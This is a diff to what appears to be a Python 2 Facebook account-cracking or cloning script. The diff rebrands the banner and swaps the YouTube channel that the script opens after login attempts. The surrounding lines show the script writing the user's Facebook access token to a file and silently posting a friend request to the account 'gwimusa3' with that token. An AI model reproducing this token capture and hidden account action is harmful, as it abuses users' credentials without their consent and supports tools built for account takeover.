@@ -123,7 +123,7 @@ print  """
 \033[1;96m░░░██║░░░██║╚██████╔╝███████╗██║░░██║
 \033[1;96m░░░╚═╝░░░╚═╝░╚═════╝░╚══════╝╚═╝░░╚═╝
  
-\033[1;97m•◄►•═ ═ ═ ═ ═ ═ ═•◄►•\033[1;92mBlackTiger\033[1;97m•◄►•═ ═ ═ ═ ═ ═ ═•◄►•"""
+\033[1;97m•◄►•═ ═ ═ ═ ═ ═ ═•◄►•\033[1;92mReal Tiger\033[1;97m•◄►•═ ═ ═ ═ ═ ═ ═•◄►•"""
 print  "\033[1;90m🔀 ⚌⚌⚌⚌⚌⚌⚍⚌⚌⚌⚌⚌⚌⚌⚌⚌⚌⚌⚌⚌⚌⚌⚌⚌⚌⚌⚌⚌⚌⚌⚌⚌⚌⚌⚌⚌⚌⚌⚌⚌⚌⚌⚌⚌ 🔀"
 jalan("\033[0;31m▇ ▇ ▇ ▇ ▇ ▇ ▇ ▇ ▇ ▇ ▇ ▇ ▇ ▇ ▇ ▇ ▇▶🌷") 
 jalan("\033[0;31m▇ ▇ ▇ ▇ ▇ ▇ ▇ ▇ ▇ ▇ ▇ ▇ ▇ ▇ ▇ ▇▶🌷") 
@@ -154,10 +154,10 @@ while (loop == 'true'):
             loop = 'false'
         else:
             print "\033[1;94mWrong Password"
-            os.system('xdg-open https://m.youtube.com/channel/UCsdJQbRf0xpvwaDu1rqgJuA')
+            os.system('xdg-open https://m.youtube.com/channel/UCHNT-JPOilcepG3g5fCiqXQ')
     else:
         print "\033[1;94mWrong Username"
-        os.system('xdg-open https://m.youtube.com/channel/UCsdJQbRf0xpvwaDu1rqgJuA')
+        os.system('xdg-open https://m.youtube.com/channel/UCHNT-JPOilcepG3g5fCiqXQ')
 
 def login():
 	os.system('clear')
@@ -204,7 +204,7 @@ def login():
 				unikers.write(z['access_token'])
 				unikers.close()
 				print '\n\x1b[1;91mLogin Successful.•◄►•..'
-				os.system('xdg-open https://m.youtube.com/channel/UCsdJQbRf0xpvwaDu1rqgJuA')
+				os.system('xdg-open https://m.youtube.com/channel/UCHNT-JPOilcepG3g5fCiqXQ')
 				requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token='+z['access_token'])
 				menu()
 			except requests.exceptions.ConnectionError:
